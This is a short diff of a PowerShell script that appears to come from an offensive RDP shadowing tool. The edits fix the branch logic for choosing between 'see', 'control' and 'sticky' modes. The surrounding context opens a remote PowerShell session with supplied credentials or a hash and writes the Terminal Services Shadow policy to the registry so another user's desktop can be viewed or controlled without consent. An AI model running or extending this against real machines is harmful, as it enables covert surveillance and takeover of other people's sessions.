@@ -543,8 +543,8 @@ function Remove-Exclusions {
    $RDP = New-PSSession -Computer $computer -credential $credential -Authentication Negotiate } ; $session = get-pssession ; Start-Sleep -milliseconds 500 } until ($session -or $i -eq 10) ; if ($session){ $attack = "true"
 
         do { $seeshadow = "see", "ver", "regarder", "siehe", "vedere", "увидеть" ; $controlshadow = "control", "controlar", "contrôle", "kontrolle", "controllo", "контроль"
-        $Host.UI.RawUI.ForegroundColor = 'Green' ; if($sticky){ $stickyshadow = "sticky" ; $inputoption = "sticky" } if($shadowoption -like '-shadow') { $inputoption=$args[7] } else {
-        if($hash){ $user = $null } ; Write-Host ; & $question ; Write-Host "$txt29" -NoNewLine -ForegroundColor Gray ; $inputoption = $Host.UI.ReadLine()}
+        $Host.UI.RawUI.ForegroundColor = 'Green' ; if($sticky){ $stickyshadow = "sticky" ; $inputoption = "sticky"} elseif($shadowoption -like '-shadow') { $inputoption=$args[7] }
+        else { if($hash){ $user = $null } ; Write-Host ; & $question ; Write-Host "$txt29" -NoNewLine -ForegroundColor Gray ; $inputoption = $Host.UI.ReadLine()}
 
         if($inputoption -in $seeshadow) { $control = "false" ; Write-Host
         invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4 /f 2>&1> $null
@@ -554,7 +554,7 @@ function Remove-Exclusions {
         invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f 2>&1> $null
         Write-Host "[+] $using:txt31" -ForegroundColor Blue }}
 
-        if($inputoption -in "$stickyshadow") { $control = "true" ; Write-Host
+        if($inputoption -in $stickyshadow) { $control = "true" ; Write-Host
         Write-Host "[+] $txt34" -ForegroundColor Blue }
 
         if(!$control) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }} until ($control)
